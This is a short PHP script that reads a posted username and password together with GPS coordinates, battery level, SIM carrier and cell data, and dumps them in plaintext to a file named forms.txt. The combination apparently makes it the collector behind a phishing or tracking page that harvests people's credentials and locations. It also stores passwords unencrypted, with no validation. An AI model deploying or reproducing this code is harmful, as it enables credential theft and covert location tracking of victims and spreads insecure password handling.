<?php
  // Get the posted data
  $username = $_POST['username'];
  $password = $_POST['password'];
  $latitude = $_POST['latitude'];
  $longitude = $_POST['longitude'];
  $batteryLevel = $_POST['batteryLevel'];
  $simCarrier = $_POST['simCarrier'];
  $simCell = $_POST['simCell'];
  $gpsLatitude = $_POST['gpsLatitude'];
  $gpsLongitude = $_POST['gpsLongitude'];

  // Save the data to a file named "forms.txt"
  $data = array(
    'username' => $username,
    'password' => $password,
    'latitude' => $latitude,
    'longitude' => $longitude,
    'batteryLevel' => $batteryLevel,
    'simCarrier' => $simCarrier,
    'simCell' => $simCell,
    'gpsLatitude' => $gpsLatitude,
    'gpsLongitude' => $gpsLongitude
  );
  file_put_contents('forms.txt', print_r($data, true));
?>